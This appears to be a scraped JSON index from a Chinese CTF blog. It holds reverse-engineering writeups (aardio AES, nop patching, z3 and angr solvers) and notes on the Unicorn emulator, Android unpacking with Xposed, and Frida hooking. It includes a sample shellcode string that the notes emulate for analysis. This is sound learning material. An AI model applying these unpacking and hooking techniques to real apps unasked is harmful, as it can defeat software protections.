JSRuntime *rt; JSContext *ctx; rt = JS_NewRuntime(); ctx = JS_NewContextRaw(rt); JS_SetModuleLoaderFunc(rt, NULL, js_module_loader, NULL); JS_AddIntrinsicBaseObjects(ctx); JS_AddIntrinsicBi","date":"2020-08-29","objectID":"/%E8%93%9D%E5%B8%BD%E6%9D%AF2020-js_is_so_nice/:0:0","tags":null,"title":"蓝帽杯2020--js_is_so_NICE","uri":"/%E8%93%9D%E5%B8%BD%E6%9D%AF2020-js_is_so_nice/"},{"categories":["writeup"],"content":"是用aardio写的程序，没找到直接获取脚本的工具，先下载aardio的编译器尝试自己写脚本编译，查看生成的二进制文件。比较题目给的文件和自己生成的文件发现，代码部分几乎一模一样，应该全部都是aardio的解释器部分。在自己生成的文件中发现了使用的函数字符串，同样去查找题目给的文件，发现了下面一些关键信息： 从这些关键字可以看出题目使用的aes加密，设置了key和iv，然后使用Base64编码后输出。但是key和iv未知。aardio的基本都是基于winapi实现的，查看文件运行时导入表中有cryptsp.dll，对cryptsp.dll的CryptSetKeyParam函数下断点 可以得到加密使用的key和iv(需要到这个函数四次，第三次才是key，第四次是iv)。然后直接使用aardio进行解密: import console import crypt.aes import crypt.bin sstr = \"8QAUFzIzw0gtrLeRUpesieQJDC6jxCujTszwcj/I9nU1h3J5LlMBcUS38IO5AHRY\" str = crypt.bin.decodeBase64(sstr) keylist = string.pack(0xE3, 0xDF, 0xB2, 0x4A, 0x55, 0x53, 0xED, 0xAC, 0x13, 0xFF, 0x65, 0xAC, 0x7B, 0x5F, 0x31, 0x70) ivlist = string.pack(0x9d,0x25,0xdd,0xe0,0xc1,0x37,0x86,0x21,0x32,0xec,0x0c,0x32,0x4c,0xfb,0xf0,0x46) var des = crypt.aes() des.setPassword(keylist) des.setInitVector(ivlist) flag = des.decrypt(str) console.log(flag) console.pause(true) Nu1L的wp中提供了aardio加密时使用的源代码，问了一下师傅说是自己写的提取工具，给跪了。 keylist = { 18908379, 33159482, 16588432, 17582695, 33159482, 33159482, 33490903, 15925590, 32828061, 16257011, 16919853, 18245537, 18576958, 17914116, 16588432, 16257011, 16919853, 16588432, 33490903, 32828061, 15925590, 32828061, 16919853, 16588432, 17251274, 32828061, 33822324, 32496640, 33822324, 15925590, 17251274, 17914116, 33490903, 16919853, 33159482, 33822324, 32496640, 16588432, 17251274, 32165219, 17582695, 17582695, 17582695, 16919853, 33490903, 33159482, 32165219, 32828061, 16257011, 16919853, 33822324, 33822324, 17914116, 17582695, 32165219, 32828061, 18245537, 32496640, 17582695, 33822324, 16919853, 16257011, 18245537, 15925590 } function deckey(owner) local i, j local ss = \"\" for i = 1, 64 do j = (keylist[i] - 17382) / 331421 ss = ss .. string:pack(j) end return ss end console:setTitle(\"reg\") local flag = console:getText(\"Input your flag:\") console:log(\"check your reg code:\" .. flag) local secretstr = deckey(console) local aesiv = crypt.bin:decodeHex(string:left(secretstr, 32)) local aeskey = crypt.bin:decodeHex(string:right(secretstr, 32)) local aes = crypt:aes() aes:setPassword(aeskey) aes:setInitVector(aesiv) local cipher = aes:encrypt(flag) local output = crypt.bin:encodeBase64(cipher) string:save(\"output\", output) console:log(\"cipher:\", output) console:pause() 再贴一个其他师傅的wp: https://www.52pojie.cn/thread-1255567-1-1.html ","date":"2020-08-29","objectID":"/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF2020-reg/:0:0","tags":null,"title":"钓鱼城杯2020-reg","uri":"/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF2020-reg/"},{"categories":["writeup"],"content":"nop 去掉花指令后的main函数如下: int __cdecl main(int a1, char **a2) { _BYTE *v2; // eax sub_804865B(*a2); puts(\"input your flag\"); __isoc99_scanf(\"%d\", \u0026dword_804A038); ++dword_804A038; sub_804857B(); ++dword_804A038; sub_80485C4(); dword_804A038 -= 0x33333334; sub_80485C4(); ++dword_804A038; sub_80485C4(); v2 = sub_8048691((_BYTE *)dword_804A038); sub_8048691(v2 + 1); puts(\"Wrong!\"); return 0; } 输入是一个数字，sub_804857B和sub_80485C4都是反调试，sub_8048691会把参数处地址的值改为0x90，就是nop，调用了两次可以nop两个字节，所以可以把下面: .text:08048763 EB 00 jmp short $+2 .text:08048765 ; --------------------------------------------------------------------------- .text:08048765 .text:08048765 loc_8048765: ; CODE XREF: main+C7↑j .text:08048765 EB 12 jmp short loc_8048779 .text:08048767 ; --------------------------------------------------------------------------- .text:08048767 83 EC 0C sub esp, 0Ch .text:0804876A 68 35 88 04 08 push offset format ; \"Right\" .text:0804876F E8 8C FC FF FF call _printf .text:08048774 83 C4 10 add esp, 10h .text:08048777 EB 10 jmp short loc_8048789 8048765处的两字节nop掉，可以输出Right ","date":"2020-06-26","objectID":"/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42020-re/:1:0","tags":null,"title":"第五空间2020-re","uri":"/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42020-re/"},{"categories":["writeup"],"content":"ManageCode 应该用了c#和cpp联合编译，用dnspy在c#中只能找到flag的格式是111111-111111-111111-11111111111111，但是没看到检测流程 用ida打开可以看到检测的流程，首先将输入转16进制，然后对这个16进制数下访问断点可以到检测的函数，直接解方程。 from z3 import * solver = Solver() a1 = [Int('s%i' % i) for i in range(16)] v1 = 1 v2 = a1[0] v3 = a1[2] v32 = a1[0] v29 = a1[2] v31 = a1[1] solver.add( -401736 * v2 == -4419096 ) v1 = 0 solver.add( 191967 * a1[1] + 473999 * v2 == 23642821 ) v1 = 0 v4 = 57125 * v2 v5 = a1[3] v6 = a1[4] v30 = a1[3] v28 = a1[4] solver.add( v4 + 465507 * v31 - 207145 * v3 == 42831307 ) v1 = 0 solver.add( 149773 * v5 + -488633 * v32 - 5245 * v31 - 280749 * v3 == -560637 ) v1 = 0 solver.add( 381790 * v3 + 59135 * v6 + 130415 * v31 + 174205 * v5 - 83562 * v32 == 27764403 ) v1 = 0 v7 = a1[5] v27 = a1[5] v8 = 500139 * v6 v9 = v1 solver.add( 386908 * v32 + 465831 * v30 + v8 + 500998 * v7 + 474240 * v3 - 4838 * v31 == 119143813 ) v9 = 0 v10 = a1[6] v26 = v10 solver.add( 182991 * v30 + -200009 * v31 - 497601 * v32 - 153099 * v10 + 269682 * v28 + -269523 * v7 - 441164 * v29 == -52489521 ) v9 = 0 v11 = a1[7] v23 = a1[7] solver.add( -14894 * v11- 162386 * v32+ 522547 * v30+ 260922 * v27+ 428523 * v29+ 508037 * v28- 144626 * v31- 99507 * v10 == 67497415 ) v9 = 0 v12 = a1[8] v25 = a1[8] solver.add( 51126 * v29+ 145838 * v11+ 362957 * v28+ 43500 * v31+ 308294 * v32+ -375461 * v30- 174341 * v12- 394061 * v10- 65395 * v27 == -43306962 ) v9 = 0 v13 = a1[9] v24 = v13 solver.add( 350654 * v32+ 495127 * v28+ 434878 * v11- 75418 * v26- 43467 * v31+ -521005 * v27- 226910 * v12- 215985 * v13- 121973 * v30- 446107 * v29 == -137046349 ) v9 = 0 v14 = a1[10] v22 = v14 solver.add( -318934 * v31- 25936 * v32- 341583 * v25+ 320416 * v29+ 339525 * v23- 81574 * v28- 502348 * v26- 294177 * v14- 363326 * v30- 391486 * v27- 248464 * v13 == -244744603 ) v9 = 0 v15 = a1[11] v21 = a1[11] solver.add( 81654 * v23+ 432919 * v26+ 110106 * v25- 507164 * v29- 467060 * v27+ -384845 * v15- 197253 * v24- 354555 * v31- 16893 * v14- 254110 * v32- 479559 * v30- 50999 * v28 == -214023755 ) v9 = 0 v16 = a1[12] v20 = v16 solver.add( -117388 * v24- 227694 * v32+ 457647 * v28+ 293306 * v23+ 101385 * v30+ 293124 * v22+ 92941 * v16+ 496679 * v25+ 79854 * v29+ -81913 * v31- 507308 * v27- 3285 * v15- 71736 * v26 == 50059304 ) v9 = 0 v17 = a1[13] solver.add( 281406 * v29+ 314118 * v28+ -480916 * v23- 124091 * v17- 442447 * v22- 25649 * v32+ 389372 * v16+ 15089 * v30+ 210603 * v26+ 5 * (v25 + 17363 * v27 - 91574 * v21)- 469378 * v24- 117744 * v31 == -176657564 ) v9 = 0 v18 = a1[14] solver.add( 180059 * v26+ 350603 * v32+ -439557 * v21- 485708 * v29+ 52520 * v24+ 303697 * v28+ 395976 * v22+ 406658 * v27+ -354103 * v17- 61339 * v20- 495692 * v31- 198340 * v30- 28153 * v25- 113385 * v23- 492085 * v18 == -48802225 ) v9 = 0 result = v9 solver.add( 473763 * v25+ 249640 * v26+ 450341 * v30+ 273347 * v17+ 386739 * v31+ 24246 * v27+ 20430 * v21+ 69055 * v28+ 391476 * v22+ 100872 * v23+ 458039 * v20+ 71004 * v24+ -277369 * v29- 482854 * a1[15]- 468152 * v32- 409044 * v18 == 224749784 ) print solver.check() print solver.model() # 111111-111111-111111-11111111111111 ","date":"2020-06-26","objectID":"/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42020-re/:2:0","tags":null,"title":"第五空间2020-re","uri":"/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42020-re/"},{"categories":["writeup"],"content":"rev rop控制指令的跳转，调试可以看大具体处理流程，用z3解一下 #coding=utf-8 from z3 import * solver = Solver() a1 = [BitVec('s%i' % i, 8) for i in range(16)] res = [0x64, 0x25, 0x0F, 0x6C, 0x20, 0x23, 0x8A, 0xDE, 0x10, 0x0E, 0xA5, 0xE1, 0x43, 0x37, 0x11, 0x53] # s = [ord('1'), ord('5'), ord('9'), ord('d')] rt = [] for t in range(4): s = [] for u in range(4): s.append([a1[t + 4*u]]) for edx in range(1, 5): eax = s[-1 + edx] esi = eax * 2 ecx = esi ecx = ecx ^ 0x1b eax = edx eax = eax \u0026 3 ecx = s[eax] eax = ecx + ecx ebx = ecx ebx = ebx ^ 0x1b ebx = ebx ^ eax eax = eax ^ ecx ecx = edx + 1 ebx = edx + 2 ecx = ecx \u0026 3 ebx = ebx \u0026 3 ecx = s[ecx] ecx = ecx ^ s[ebx] ecx = ecx ^ esi eax = eax ^ ecx rt.append(eax ^ (4*t + edx - 1)) for i in range(len(rt)): solver.add(rt[i] == res[i]) print solver.check() print solver.model() Nu1L的wp中用到了angr直接解题，当时我想着用但是不知道怎么输入参数(还是tcl)记录一下 import angr,claripy project = angr.Project(\"rev_v2\") argv1 = claripy.BVS(\"argv1\",100*8) initial_state = project.factory.entry_state(args=[\"./rev_v2\",argv1]) simulation = project.factory.simgr(initial_state) simulation.explore(find=0x400481) found = simulation.found[0] solution = found.solver.eval(argv1, cast_to=bytes) print(repr(solution)) solution = solution[:solution.find(b\"\\x00\")] print(solution) ","date":"2020-06-26","objectID":"/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42020-re/:3:0","tags":null,"title":"第五空间2020-re","uri":"/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42020-re/"},{"categories":["notes"],"content":"介绍 Unocorn引擎是什么? 简单的来讲，一款模拟器。尽管不太常见，你不能用来模拟整个程序或者系统，同时它也不支持syscall。你只能通过手动的方式来映射内存以及数据写入，然后就可以从某个指定的地址开始执行模拟了。 模拟器在什么时候是有用的？ 你可以执行一些恶意软件中你感兴趣的函数而不必创建整个进程 CTF比赛中也很常用 Fuzzing GDB插件扩充，例如支持长跳转 模拟混淆后的代码 ","date":"2020-06-16","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%A4%A9-unicorn/:1:0","tags":null,"title":"Unicorn","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%A4%A9-unicorn/"},{"categories":["notes"],"content":"备忘 from unicorn import * - 加载Unicorn库。包含一些函数和基本的常量。 from unicorn.x86_const import* - 加载 X86 和X64架构相关的常量 所有unicorn模块中的常量 UC_API_MAJOR UC_ERR_VERSION UC_MEM_READ UC_PROT_ALL UC_API_MINOR UC_ERR_WRITE_PROT UC_MEM_READ_AFTER UC_PROT_EXEC UC_ARCH_ARM UC_ERR_WRITE_UNALIGNED UC_MEM_READ_PROT UC_PROT_NONE UC_ARCH_ARM64 UC_ERR_WRITE_UNMAPPED UC_MEM_READ_UNMAPPED UC_PROT_READ UC_ARCH_M68K UC_HOOK_BLOCK UC_MEM_WRITE UC_PROT_WRITE UC_ARCH_MAX UC_HOOK_CODE UC_MEM_WRITE_PROT UC_QUERY_MODE UC_ARCH_MIPS UC_HOOK_INSN UC_MEM_WRITE_UNMAPPED UC_QUERY_PAGE_SIZE UC_ARCH_PPC UC_HOOK_INTR UC_MILISECOND_SCALE UC_SECOND_SCALE UC_ARCH_SPARC UC_HOOK_MEM_FETCH UC_MODE_16 UC_VERSION_EXTRA UC_ARCH_X86 UC_HOOK_MEM_FETCH_INVALID UC_MODE_32 UC_VERSION_MAJOR UC_ERR_ARCH UC_HOOK_MEM_FETCH_PROT UC_MODE_64 UC_VERSION_MINOR UC_ERR_ARG UC_HOOK_MEM_FETCH_UNMAPPED UC_MODE_ARM Uc UC_ERR_EXCEPTION UC_HOOK_MEM_INVALID UC_MODE_BIG_ENDIAN UcError UC_ERR_FETCH_PROT UC_HOOK_MEM_PROT UC_MODE_LITTLE_ENDIAN arm64_const UC_ERR_FETCH_UNALIGNED UC_HOOK_MEM_READ UC_MODE_MCLASS arm_const UC_ERR_FETCH_UNMAPPED UC_HOOK_MEM_READ_AFTER UC_MODE_MICRO debug UC_ERR_HANDLE UC_HOOK_MEM_READ_INVALID UC_MODE_MIPS3 m68k_const UC_ERR_HOOK UC_HOOK_MEM_READ_PROT UC_MODE_MIPS32 mips_const UC_ERR_HOOK_EXIST UC_HOOK_MEM_READ_UNMAPPED UC_MODE_MIPS32R6 sparc_const UC_ERR_INSN_INVALID UC_HOOK_MEM_UNMAPPED UC_MODE_MIPS64 uc_arch_supported UC_ERR_MAP UC_HOOK_MEM_VALID UC_MODE_PPC32 uc_version UC_ERR_MODE UC_HOOK_MEM_WRITE UC_MODE_PPC64 unicorn UC_ERR_NOMEM UC_HOOK_MEM_WRITE_INVALID UC_MODE_QPX unicorn_const UC_ERR_OK UC_HOOK_MEM_WRITE_PROT UC_MODE_SPARC32 version_bind UC_ERR_READ_PROT UC_HOOK_MEM_WRITE_UNMAPPED UC_MODE_SPARC64 x86_const UC_ERR_READ_UNALIGNED UC_MEM_FETCH UC_MODE_THUMB UC_ERR_READ_UNMAPPED UC_MEM_FETCH_PROT UC_MODE_V8 UC_ERR_RESOURCE UC_MEM_FETCH_UNMAPPED UC_MODE_V9 mu = Uc(arch,mode) - 获取Uc实例。在这里指定目标架构，例如： mu = Uc(UC_ARCH_X86,UC_MODE_64) - 获取X86-64架构的实例。 mu = Uc(UC_ARCH_X86,UC_MODE_32) - 获取X86-32架构的实例。 mu.mem_map(ADDRESS,4096) - 映射一片内存区域 mu.mem_write(ADDRESS,DATA) - 向内存中写入数据 tmp = mu.mem_read(ADDRESS,SIZE) - 从内存中读取数据 mu.reg_write(UC_X86_REG_ECX,0X0) - 设置ECX值。 r_esp = mu.reg_read(UC_X86_REG_ESP) - 读取ESP的值。 mu.emu_start(ADDRESS_START,ADDRESS_END) - 开始执行模拟。 命令追踪: def hook_code(mu, address, size, user_data): print('\u003e\u003e\u003e Tracing instruction at 0x%x, instruction size = 0x%x' %(address, size)) mu.hook_add(UC_HOOK_CODE, hook_code) 这段代码添加了一个HOOK（向Unicorn引擎中），我们定义的函数会在执行每一条命令之前被执行。参数含义如下： Uc实例 指令的地址 指令的长度 用户定义数据（通过hook_add()函数传递） ","date":"2020-06-16","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%A4%A9-unicorn/:2:0","tags":null,"title":"Unicorn","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%A4%A9-unicorn/"},{"categories":["notes"],"content":"第一个例子: fibonacci #coding=utf-8 from unicorn import * from unicorn.x86_const import * import struct def read(name): with open(name, 'rb') as f: return f.read() def u32(data): return struct.unpack(\"I\", data)[0] def p32(num): return struct.pack(\"I\", num) # 为x86-64架构初始化一下Unicorn引擎。 mu = Uc (UC_ARCH_X86, UC_MODE_64) # Uc函数需要一下参数： # 第一个参数：架构类型。这些常量以UC_ATCH_为前缀 # 第二个参数：架构细节说明。这些常量以UC_MODE_为前缀 BASE = 0x400000 STACK_ADDR = 0x0 STACK_SIZE = 1024*1024 # mem_map: 映射内存 mu.mem_map(BASE, 1024*1024) # 初始化存储空间 mu.mem_map(STACK_ADDR, STACK_SIZE) # 初始化栈空间 mu.mem_write(BASE, read(\"./fibonacci\")) # 加载程序 # rsp指向栈顶 mu.reg_write(UC_X86_REG_RSP, STACK_ADDR + STACK_SIZE - 1) # 因为库函数没有加载，所以调用库函数的地方需要跳过 instructions_skip_list = [0x00000000004004EF, 0x00000000004004F6, 0x0000000000400502, 0x000000000040054F] def hook_code(mu, address, size, user_data): #print('\u003e\u003e\u003e Tracing instruction at 0x%x, instruction size = 0x%x' %(address, size)) if address in instructions_skip_list: mu.reg_write(UC_X86_REG_RIP, address+size) elif address == 0x400560: #that instruction writes a byte of the flag c = mu.reg_read(UC_X86_REG_RDI) print(chr(c)) mu.reg_write(UC_X86_REG_RIP, address+size) mu.hook_add(UC_HOOK_CODE, hook_code) mu.emu_start(0x00000000004004E0, 0x0000000000400575) ","date":"2020-06-16","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%A4%A9-unicorn/:3:0","tags":null,"title":"Unicorn","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%A4%A9-unicorn/"},{"categories":["notes"],"content":"第二个例子: 分析shellcode from unicorn import * from unicorn.x86_const import * shellcode = \"\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5d\\x6a\\x05\\x5b\\x29\\xdd\\x83\\xc5\\x4e\\x89\\xe9\\x6a\\x02\\x03\\x0c\\x24\\x5b\\x31\\xd2\\x66\\xba\\x12\\x00\\x8b\\x39\\xc1\\xe7\\x10\\xc1\\xef\\x10\\x81\\xe9\\xfe\\xff\\xff\\xff\\x8b\\x45\\x00\\xc1\\xe0\\x10\\xc1\\xe8\\x10\\x89\\xc3\\x09\\xfb\\x21\\xf8\\xf7\\xd0\\x21\\xd8\\x66\\x89\\x45\\x00\\x83\\xc5\\x02\\x4a\\x85\\xd2\\x0f\\x85\\xcf\\xff\\xff\\xff\\xec\\x37\\x75\\x5d\\x7a\\x05\\x28\\xed\\x24\\xed\\x24\\xed\\x0b\\x88\\x7f\\xeb\\x50\\x98\\x38\\xf9\\x5c\\x96\\x2b\\x96\\x70\\xfe\\xc6\\xff\\xc6\\xff\\x9f\\x32\\x1f\\x58\\x1e\\x00\\xd3\\x80\" BASE = 0x400000 STACK_ADDR = 0x0 STACK_SIZE = 1024*1024 mu = Uc (UC_ARCH_X86, UC_MODE_32) mu.mem_map(BASE, 1024*1024) mu.mem_map(STACK_ADDR, STACK_SIZE) mu.mem_write(BASE, shellcode) mu.reg_write(UC_X86_REG_ESP, STACK_ADDR + STACK_SIZE/2) def syscall_num_to_name(num): syscalls = {1: \"sys_exit\", 15: \"sys_chmod\"} return syscalls[num] def hook_code(mu, address, size, user_data): print('\u003e\u003e\u003e Tracing instruction at 0x%x, instruction size = 0x%x' %(address, size)) machine_code = mu.mem_read(address, size) if machine_code == \"\\xcd\\x80\": # int 80 r_eax = mu.reg_read(UC_X86_REG_EAX) r_ebx = mu.reg_read(UC_X86_REG_EBX) r_ecx = mu.reg_read(UC_X86_REG_ECX) r_edx = mu.reg_read(UC_X86_REG_EDX) syscall_name = syscall_num_to_name(r_eax) print \"--------------\" print \"We intercepted system call: \"+syscall_name if syscall_name == \"sys_chmod\": s = mu.mem_read(r_ebx, 20).split(\"\\x00\")[0] print \"arg0 = 0x%x-\u003e %s\" % (r_ebx, s) print \"arg1 = \" + oct(r_ecx) elif syscall_name == \"sys_exit\": print \"arg0 = \" + hex(r_ebx) exit() mu.reg_write(UC_X86_REG_EIP, address + size) mu.hook_add(UC_HOOK_CODE, hook_code) mu.emu_start(BASE, BASE-1) # 根据exit命令退出，直接加载整个shellcode 所以不仅可以直接可执行文件中的一段代码，还可以直接执行shellcode ","date":"2020-06-16","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%A4%A9-unicorn/:4:0","tags":null,"title":"Unicorn","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%A4%A9-unicorn/"},{"categories":["notes"],"content":"第三个例子 from unicorn import * from unicorn.x86_const import * import struct def read(name): with open(name) as f: return f.read() def u32(data): return struct.unpack(\"I\", data)[0] def p32(num): return struct.pack(\"I\", num) mu = Uc (UC_ARCH_X86, UC_MODE_32) BASE = 0x08048000 STACK_ADDR = 0x0 STACK_SIZE = 1024*1024 mu.mem_map(BASE, 1024*1024) mu.mem_map(STACK_ADDR, STACK_SIZE) mu.mem_write(BASE, read(\"./function\")) r_esp = STACK_ADDR + (STACK_SIZE/2) #ESP points to this address at function call STRING_ADDR = 0x0 mu.mem_write(STRING_ADDR, \"batman\\x00\") #write \"batman\" somewhere. We have choosen an address 0x0 which belongs to the stack. mu.reg_write(UC_X86_REG_ESP, r_esp) #set ESP mu.mem_write(r_esp+4, p32(5)) #set the first argument. It is integer 5 mu.mem_write(r_esp+8, p32(STRING_ADDR)) #set the second argument. This is a pointer to the string \"batman\" mu.emu_start(0x8048464, 0x804849A) #start emulation from the beginning of super_function, end at RET instruction return_value = mu.reg_read(UC_X86_REG_EAX) print \"The returned value is: %d\" % return_value 可以通过修改内存来控制函数的调用参数 ","date":"2020-06-16","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%A4%A9-unicorn/:5:0","tags":null,"title":"Unicorn","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%A4%A9-unicorn/"},{"categories":["notes"],"content":"第四个例子 from unicorn import * from unicorn.arm_const import * import struct def read(name): with open(name) as f: return f.read() def u32(data): return struct.unpack(\"I\", data)[0] def p32(num): return struct.pack(\"I\", num) mu = Uc (UC_ARCH_ARM, UC_MODE_LITTLE_ENDIAN) BASE = 0x10000 STACK_ADDR = 0x300000 STACK_SIZE = 1024*1024 mu.mem_map(BASE, 1024*1024) mu.mem_map(STACK_ADDR, STACK_SIZE) mu.mem_write(BASE, read(\"./task4\")) mu.reg_write(UC_ARM_REG_SP, STACK_ADDR + STACK_SIZE/2) instructions_skip_list = [] CCC_ENTRY = 0x000104D0 CCC_END = 0x00010580 stack = [] # Stack for storing the arguments d = {} # Dictionary that holds return values for given function arguments def hook_code(mu, address, size, user_data): #print('\u003e\u003e\u003e Tracing instruction at 0x%x, instruction size = 0x%x' %(address, size)) if address == CCC_ENTRY: # Are we at the beginning of ccc function? arg0 = mu.reg_read(UC_ARM_REG_R0) # Read the first argument. it is passed by R0 if arg0 in d: # Check whether return value for this function is already saved. ret = d[arg0] mu.reg_write(UC_ARM_REG_R0, ret) # Set return value in R0 mu.reg_write(UC_ARM_REG_PC, 0x105BC) # Set PC to point at \"BX LR\" instruction. We want to return from fibonacci function else: stack.append(arg0) # If return value is not saved for this argument, add it to stack. elif address == CCC_END: arg0 = stack.pop() # We know arguments when exiting the function ret = mu.reg_read(UC_ARM_REG_R0) # Read the return value (R0) d[arg0] = ret # Remember the return value for this argument mu.hook_add(UC_HOOK_CODE, hook_code) mu.emu_start(0x00010584, 0x000105A8) return_value = mu.reg_read(UC_ARM_REG_R1) # We end the emulation at printf(\"%d\\n\", ccc(x)). print \"The return value is %d\" % return_value arm版本 ","date":"2020-06-16","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%A4%A9-unicorn/:6:0","tags":null,"title":"Unicorn","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%A4%A9-unicorn/"},{"categories":["notes"],"content":"参考链接 https://bbs.pediy.com/thread-224330.htm http://eternal.red/2018/unicorn-engine-tutorial/#cheatsheet https://ctf-wiki.github.io/ctf-wiki/reverse/unicorn/introduction-zh/ 这里有很多代码示例： https://github.com/unicorn-engine/unicorn/tree/master/bindings/python ","date":"2020-06-16","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%A4%A9-unicorn/:7:0","tags":null,"title":"Unicorn","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%8D%81%E4%B8%89%E5%A4%A9-unicorn/"},{"categories":["notes"],"content":"ApkShelling https://github.com/OakChen/ApkShelling 修改XposedEntry.java中的targetPackages private static final String[] targetPackages = new String[]{\"com.sfysoft.shellingtest\", \"com.sfysoft.shellingtest2\", \"com.example.how_debug\"}; 重启手机运行加壳程序 $ adb logcat -s Xposed 06-15 14:58:01.091 6048 6048 I Xposed : Found com.SecShell.SecShell.ApplicationWrapper 06-15 14:58:01.119 6048 6064 I Xposed : Thread: 246, File: /data/data/com.example.how_debug/00246-01.dex 06-15 14:58:01.228 6048 6064 I Xposed : Thread: 246, File: /data/data/com.example.how_debug/00246-02.dex pull 生成的dex 如果出现Not found object的问题，可以先把文件移动到/sdcard/ root@angler:/data/data/com.example.how_debug # cp 00246-01.dex /sdcard/01.dex root@angler:/data/data/com.example.how_debug # cp 00246-02.dex /sdcard/02.dex ","date":"2020-06-15","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E5%A4%A9-android%E8%84%B1%E5%A3%B3/:1:0","tags":null,"title":"Android脱壳","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E5%A4%A9-android%E8%84%B1%E5%A3%B3/"},{"categories":["notes"],"content":"Frida框架使用 安装： https://github.com/frida/frida push frida-server-arm64 /data/local/tmp chmod 777 frida-server-arm64 ./frida-server-arm64 # 端口转发 adb forward tcp:27043 tcp:27043 adb forward tcp:27042 tcp:27042 # 检查是否成功 frida-ps -U frida自带的Messages机制与进程交互 import frida, sys # hook代码，采用javascript编写 jscode = \"\"\" javascript代码，重点 \"\"\" # 自定义回调函数 def on_message(message, data): if message['type'] == 'send': print(\"[*] {0}\".format(message['payload'])) else: print(message) # 重点的4行代码 # 获取手机设备并附加到进程 process = frida.get_usb_device().attach('应用完整包名') script = process.create_script(jscode) # 回调 script.on('message', on_message) # 在服务端就启动javascript脚本了 script.load() sys.stdin.read() 这里用到的语言分别是python和javascript，他们之间的关系是python作为载体，javascript作为在android中真正执行代码。 运行给的两个实例 直接hook MainActivity中的OnCreate()方法，获取calc函数的返回值 js代码解释 //Java.Perform 开始执行JavaScript脚本。 Java.perform(function () { //定义变量MainActivity，Java.use指定要使用的类 var MainActivity = Java.use('com.example.seccon2015.rock_paper_scissors.MainActivity'); //hook该类下的onCreate方法，重新实现它 MainActivity.onCreate.implementation = function () { send(\"Hook Start...\"); //调用calc()方法，获取返回值 var returnValue = this.calc(); send(\"Return:\"+returnValue); var result = (1000+returnValue)*107; //解出答案 send(\"Flag:\"+\"SECCON{\"+result.toString()+\"}\"); } }); 完整实现 import frida, sys def on_message(message, data): if message['type'] == 'send': print(\"[*] {0}\".format(message['payload'])) else: print(message) jscode = \"\"\" Java.perform(function () { var MainActivity = Java.use('com.example.seccon2015.rock_paper_scissors.MainActivity'); MainActivity.onCreate.implementation = function () { send(\"Hook Start...\"); var returnValue = this.calc(); send(\"Return:\"+returnValue); var result = (1000+returnValue)*107; send(\"Flag:\"+\"SECCON{\"+result.toString()+\"}\"); } }); \"\"\" process = frida.get_usb_device().attach('com.example.seccon2015.rock_paper_scissors') script = process.create_script(jscode) script.on('message', on_message) script.load() sys.stdin.read() 修改MainActivity中的变量 js代码 Java.perform(function () { var MainActivity = Java.use('com.example.seccon2015.rock_paper_scissors.MainActivity'); //hook onClick方法，此处要注意的是onClick方法是传递了一个View参数v MainActivity.onClick.implementation = function (v) { send(\"Hook Start...\"); //调用onClick,模拟点击事件 this.onClick(v); //修改参数 this.n.value = 0; this.m.value = 2; this.cnt.value = 999; send(\"Success!\") } }); 完整代码实现 import frida, sys def on_message(message, data): if message['type'] == 'send': print(\"[*] {0}\".format(message['payload'])) else: print(message) jscode = \"\"\" Java.perform(function () { var MainActivity = Java.use('com.example.seccon2015.rock_paper_scissors.MainActivity'); MainActivity.onClick.implementation = function (v) { send(\"Hook Start...\"); this.onClick(v); this.n.value = 0; this.m.value = 2; this.cnt.value = 999; send(\"Success!\") } }); \"\"\" process = frida.get_usb_device().attach('com.example.seccon2015.rock_paper_scissors') script = process.create_script(jscode) script.on('message', on_message) script.load() sys.stdin.read() 由于关键的实现部分其实在于js代码，下面是frida js中的一些关键函数 https://www.frida.re/docs/javascript-api/ 